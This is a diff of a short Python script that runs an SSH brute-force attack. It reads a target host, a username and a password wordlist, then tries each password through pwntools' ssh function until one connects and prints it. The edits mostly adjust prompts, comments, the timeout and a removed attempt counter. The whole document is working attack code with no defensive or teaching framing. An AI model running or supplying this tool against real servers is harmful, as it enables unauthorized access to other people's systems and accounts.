@@ -3,26 +3,21 @@ import paramiko
 import sys
 
 host = input("Enter host: ex.127.0.0.1\n ")
-username = input("Enter username: ex.root\n ")
-attempts = 0
+username = input("Enter username: ex.hackerman\n ")
 
-#Open file with read permissions 
-with open(input("Enter file path ex./etc/passwd.txt\n "), "r") as password_list:
-  print("[+] Starting brute force attack on " + host + " with username " + username)
+# Open file with read permissions
+with open(input("Enter filename: ex.passwordList.txt\n ").strip("\n"), "r") as password_list:
+  print("\n[*] Starting SSH brute force attack on " + host + " with username " + username)
   for password in password_list:
-    password = password.strip("\n") #Stripping password
-    try: 
-      print("Trying: {}".format(password))
-      #Utilizing ssh function from pwn library
-      response = ssh(host=host, user=username, password=password, timeout=1) 
-      #If the connection is successful
-      if response.connected: 
+    password = password.strip("\n") # Stripping password
+    try:
+      print("\nTrying: {}".format(password))
+      response = ssh(host=host, user=username, password=password, timeout=2) # Utilizing ssh function from pwn library
+      if response.connected:  # If the connection is successful
         print("[+] Password found: {}".format(password))
         response.close()
         break
-      #Closing if no response
-      response.close() 
+      response.close() # Closing if no response
     except:
       paramiko.ssh_exception.AuthenticationException
-      print("[-] Password not found: {}".format(password))
-    attempts += 1
+      print("[X] Authentication Failed: {}".format(password))
